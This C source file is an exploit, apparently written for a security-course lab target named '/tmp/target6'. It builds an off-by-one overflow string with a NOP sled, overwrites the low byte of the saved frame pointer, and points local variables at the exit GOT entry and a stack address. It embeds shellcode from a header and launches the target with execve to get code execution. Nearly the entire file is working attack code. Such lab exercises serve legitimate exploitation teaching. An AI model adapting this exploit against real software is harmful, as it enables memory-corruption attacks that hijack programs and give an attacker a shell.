#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
	int _EXIT_GOT_ADDRESS = 0x804a00c;
	// Mostly interested because this is a NOOP and will allow foo() to return.
	int EXPLOIT_ADDRESS = 0xbffffd10;

	// We make the explot one byte (+ null char) too large.
	char sploitstring[202 * sizeof(char)];

	// Fill with NOOPs and null terminate.
	memset(sploitstring, '\x90', sizeof(sploitstring));
	sploitstring[sizeof(sploitstring) - 1] = 0;

	// The value of our target ebp is 0xbffffda8. We can change the lower byte
	// 0x68 to whatever we want. We want the address to be 0xbffffd00, which is
	// 64 bytes into our buffer.
	// This clears the lower byte a bit.
	sploitstring[sizeof(sploitstring) - 2] = 0x8;
	// This is setting our "a" local.
	*(int*)(sploitstring + 64) = EXPLOIT_ADDRESS;
	// This is setting our "*p" local.
	*(int*)(sploitstring + 68) = _EXIT_GOT_ADDRESS;
	memcpy(sploitstring + 120, shellcode, sizeof(shellcode) - 1);

	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
